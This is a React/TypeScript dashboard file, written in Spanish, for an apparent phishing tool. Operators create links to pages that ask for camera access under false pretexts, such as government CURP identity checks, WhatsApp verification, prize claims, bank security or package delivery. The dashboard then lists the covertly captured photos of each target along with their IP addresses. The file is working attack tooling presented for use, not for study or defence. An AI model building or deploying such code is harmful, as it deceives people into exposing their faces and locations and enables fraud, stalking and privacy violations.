import { AppLayout } from "@/components/layout/AppLayout";
import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Camera, Plus, Trash2, Copy, Check, ExternalLink, ChevronDown, ChevronUp, X } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { auth } from "@/lib/firebase";

const API = "/api";

async function authHeaders(): Promise<Record<string, string>> {
  const token = await auth.currentUser?.getIdToken();
  return token ? { Authorization: `Bearer ${token}` } : {};
}

const PAGE_STYLES = [
  { value: "identity", label: "Verificación de Identidad (CURP/Gobierno)" },
  { value: "whatsapp", label: "Verificación de WhatsApp" },
  { value: "prize",    label: "Sorteo / Reclama tu Premio" },
  { value: "bank",     label: "Seguridad Bancaria" },
  { value: "delivery", label: "Confirmar Entrega de Paquete" },
];

interface CameraSession {
  id: number;
  token: string;
  name: string;
  description?: string;
  pageStyle: string;
  captureCount: number;
  createdAt: string;
}

interface CameraCapture {
  id: number;
  imageData: string;
  ipAddress?: string;
  userAgent?: string;
  capturedAt: string;
}

function CopyBtn({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  function copy() {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  }
  return (
    <button onClick={copy} className="p-1.5 rounded-md hover:bg-secondary transition-colors text-muted-foreground hover:text-foreground" title="Copiar enlace">
      {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
    </button>
  );
}

function PhotoModal({ src, onClose }: { src: string; onClose: () => void }) {
  return (
    <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4" onClick={onClose}>
      <div className="relative max-w-lg w-full" onClick={e => e.stopPropagation()}>
        <button onClick={onClose} className="absolute -top-10 right-0 text-white/70 hover:text-white transition-colors">
          <X className="w-6 h-6" />
        </button>
        <img src={src} alt="Captura" className="w-full rounded-xl border border-border shadow-2xl" />
      </div>
    </div>
  );
}

function SessionRow({ session, onDelete }: { session: CameraSession; onDelete: () => void }) {
  const [expanded, setExpanded] = useState(false);
  const [captures, setCaptures] = useState<CameraCapture[]>([]);
  const [loading, setLoading] = useState(false);
  const [selectedPhoto, setSelectedPhoto] = useState<string | null>(null);

  const captureUrl = `${window.location.origin}${API}/camera/${session.token}`;
  const styleLabel = PAGE_STYLES.find(p => p.value === session.pageStyle)?.label ?? session.pageStyle;

  async function loadCaptures() {
    setLoading(true);
    try {
      const hdrs = await authHeaders();
      const res = await fetch(`${API}/camera-sessions/${session.token}/data`, { headers: hdrs });
      setCaptures(await res.json());
    } catch { }
    setLoading(false);
  }

  function toggle() {
    if (!expanded) loadCaptures();
    setExpanded(!expanded);
  }

  async function handleDelete() {
    if (!confirm(`¿Eliminar sesión "${session.name}" y todas sus fotos?`)) return;
    const hdrs = await authHeaders();
    await fetch(`${API}/camera-sessions/${session.token}`, { method: "DELETE", headers: hdrs });
    onDelete();
  }

  return (
    <>
      {selectedPhoto && <PhotoModal src={selectedPhoto} onClose={() => setSelectedPhoto(null)} />}
      <motion.div initial={{ opacity: 0, y: 8 }} animate={{ opacity: 1, y: 0 }} className="bg-card border border-border rounded-xl overflow-hidden">
        <div className="p-4 flex items-start gap-3">
          <div className="w-9 h-9 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center flex-shrink-0 mt-0.5">
            <Camera className="w-4 h-4 text-primary" />
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 mb-1">
              <span className="font-semibold text-foreground">{session.name}</span>
              <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${session.captureCount > 0 ? "bg-green-500/10 text-green-400 border border-green-500/20" : "bg-secondary text-muted-foreground border border-border"}`}>
                {session.captureCount} foto{session.captureCount !== 1 ? "s" : ""}
              </span>
            </div>
            <p className="text-xs text-muted-foreground mb-2">{styleLabel}</p>
            <div className="flex items-center gap-1 bg-secondary/50 rounded-lg px-2.5 py-1.5 border border-border/50">
              <span className="text-xs font-mono text-muted-foreground truncate flex-1">{captureUrl}</span>
              <CopyBtn text={captureUrl} />
              <a href={captureUrl} target="_blank" rel="noreferrer" className="p-1.5 rounded-md hover:bg-secondary transition-colors text-muted-foreground hover:text-foreground" title="Abrir">
                <ExternalLink className="w-4 h-4" />
              </a>
            </div>
          </div>
          <div className="flex items-center gap-1 flex-shrink-0">
            <button onClick={toggle} className="p-1.5 rounded-md hover:bg-secondary transition-colors text-muted-foreground hover:text-foreground">
              {expanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
            </button>
            <button onClick={handleDelete} className="p-1.5 rounded-md hover:bg-red-500/10 transition-colors text-muted-foreground hover:text-red-400">
              <Trash2 className="w-4 h-4" />
            </button>
          </div>
        </div>

        <AnimatePresence>
          {expanded && (
            <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: "auto", opacity: 1 }} exit={{ height: 0, opacity: 0 }} className="overflow-hidden border-t border-border">
              <div className="p-4">
                {loading && <p className="text-sm text-muted-foreground text-center py-4">Cargando...</p>}
                {!loading && captures.length === 0 && (
                  <p className="text-sm text-muted-foreground text-center py-4">Aún no hay fotos capturadas</p>
                )}
                {!loading && captures.length > 0 && (
                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
                    {captures.map(c => (
                      <div key={c.id} className="space-y-1.5">
                        <button
                          onClick={() => setSelectedPhoto(c.imageData)}
                          className="w-full aspect-[4/3] rounded-lg overflow-hidden border border-border hover:border-primary/50 transition-colors"
                        >
                          <img src={c.imageData} alt="Captura" className="w-full h-full object-cover" />
                        </button>
                        <div className="text-xs text-muted-foreground space-y-0.5 px-0.5">
                          <p>{new Date(c.capturedAt).toLocaleString("es-MX")}</p>
                          {c.ipAddress && <p className="font-mono text-primary/80">{c.ipAddress}</p>}
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>
    </>
  );
}

export default function CameraList() {
  const [sessions, setSessions] = useState<CameraSession[]>([]);
  const [loading, setLoading] = useState(true);
  const [creating, setCreating] = useState(false);
  const [showForm, setShowForm] = useState(false);
  const [name, setName] = useState("");
  const [description, setDescription] = useState("");
  const [pageStyle, setPageStyle] = useState("identity");
  const { toast } = useToast();

  async function fetchSessions() {
    setLoading(true);
    try {
      const hdrs = await authHeaders();
      const res = await fetch(`${API}/camera-sessions`, { headers: hdrs });
      setSessions(await res.json());
    } catch { }
    setLoading(false);
  }

  useEffect(() => { fetchSessions(); }, []);

  async function createSession() {
    if (!name.trim()) return;
    setCreating(true);
    try {
      const hdrs = await authHeaders();
      const res = await fetch(`${API}/camera-sessions`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...hdrs },
        body: JSON.stringify({ name: name.trim(), description: description.trim() || undefined, pageStyle }),
      });
      if (res.ok) {
        setName(""); setDescription(""); setPageStyle("identity"); setShowForm(false);
        await fetchSessions();
        toast({ title: "Sesión creada", description: "El enlace de captura de cámara está listo." });
      }
    } catch { }
    setCreating(false);
  }

  return (
    <AppLayout>
      <div className="max-w-3xl mx-auto px-4 md:px-6 py-6 space-y-6">
        <motion.div initial={{ opacity: 0, y: -10 }} animate={{ opacity: 1, y: 0 }} className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-bold text-foreground">Captura de Cámara</h1>
            <p className="text-sm text-muted-foreground mt-1">Genera páginas que solicitan acceso a la cámara y capturan una foto</p>
          </div>
          <button
            onClick={() => setShowForm(!showForm)}
            className="flex items-center gap-2 bg-primary text-primary-foreground px-4 py-2 rounded-lg text-sm font-semibold hover:bg-primary/90 transition-colors shadow-[0_0_20px_rgba(0,255,255,0.15)]"
          >
            <Plus className="w-4 h-4" />
            Nueva sesión
          </button>
        </motion.div>

        <AnimatePresence>
          {showForm && (
            <motion.div initial={{ opacity: 0, height: 0 }} animate={{ opacity: 1, height: "auto" }} exit={{ opacity: 0, height: 0 }} className="overflow-hidden">
              <div className="bg-card border border-primary/30 rounded-xl p-5 shadow-[0_0_20px_rgba(0,255,255,0.05)]">
                <h2 className="font-semibold text-foreground mb-4">Nueva sesión de captura</h2>
                <div className="space-y-3">
                  <div>
                    <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Nombre de la sesión</label>
                    <input
                      value={name}
                      onChange={e => setName(e.target.value)}
                      placeholder="Ej: Objetivo 01, Test de identidad..."
                      className="w-full bg-secondary border border-border rounded-lg px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-primary/50 transition-colors"
                    />
                  </div>
                  <div>
                    <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Pretexto / Estilo de página</label>
                    <select
                      value={pageStyle}
                      onChange={e => setPageStyle(e.target.value)}
                      className="w-full bg-secondary border border-border rounded-lg px-3 py-2.5 text-sm text-foreground focus:outline-none focus:border-primary/50 transition-colors"
                    >
                      {PAGE_STYLES.map(p => (
                        <option key={p.value} value={p.value}>{p.label}</option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label className="text-xs font-medium text-muted-foreground mb-1.5 block">Descripción (opcional)</label>
                    <input
                      value={description}
                      onChange={e => setDescription(e.target.value)}
                      placeholder="Notas internas sobre esta sesión"
                      className="w-full bg-secondary border border-border rounded-lg px-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground/50 focus:outline-none focus:border-primary/50 transition-colors"
                    />
                  </div>
                  <div className="flex gap-3 pt-1">
                    <button onClick={createSession} disabled={creating || !name.trim()} className="flex-1 bg-primary text-primary-foreground py-2.5 rounded-lg text-sm font-semibold hover:bg-primary/90 transition-colors disabled:opacity-50">
                      {creating ? "Creando..." : "Crear sesión"}
                    </button>
                    <button onClick={() => setShowForm(false)} className="px-4 py-2.5 rounded-lg text-sm border border-border text-muted-foreground hover:text-foreground hover:bg-secondary transition-colors">
                      Cancelar
                    </button>
                  </div>
                </div>
              </div>
            </motion.div>
          )}
        </AnimatePresence>

        {loading ? (
          <div className="flex justify-center py-16">
            <div className="w-7 h-7 border-2 border-primary/30 border-t-primary rounded-full animate-spin" />
          </div>
        ) : sessions.length === 0 ? (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-center py-16 text-muted-foreground">
            <Camera className="w-12 h-12 mx-auto mb-3 opacity-20" />
            <p className="text-sm">No hay sesiones de cámara aún</p>
            <p className="text-xs mt-1 opacity-70">Crea una sesión para obtener tu enlace de captura</p>
          </motion.div>
        ) : (
          <div className="space-y-4">
            {sessions.map(s => (
              <SessionRow key={s.id} session={s} onDelete={fetchSessions} />
            ))}
          </div>
        )}
      </div>
    </AppLayout>
  );
}
